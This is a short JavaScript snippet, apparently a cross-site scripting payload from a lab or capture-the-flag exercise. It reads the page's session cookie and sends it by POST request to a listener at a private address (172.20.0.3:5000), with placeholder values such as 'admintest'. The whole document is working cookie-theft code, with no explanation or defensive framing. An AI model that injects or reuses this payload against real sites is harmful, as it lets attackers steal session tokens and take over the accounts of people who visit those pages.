var sessionid = document.cookie.split('=')[1]+".";

var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://172.20.0.3:5000/send');
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    console.log(xhr.responseText);
  }
};

xhr.send('header=fdsafdsa&listener=admintest&content='+sessionid);
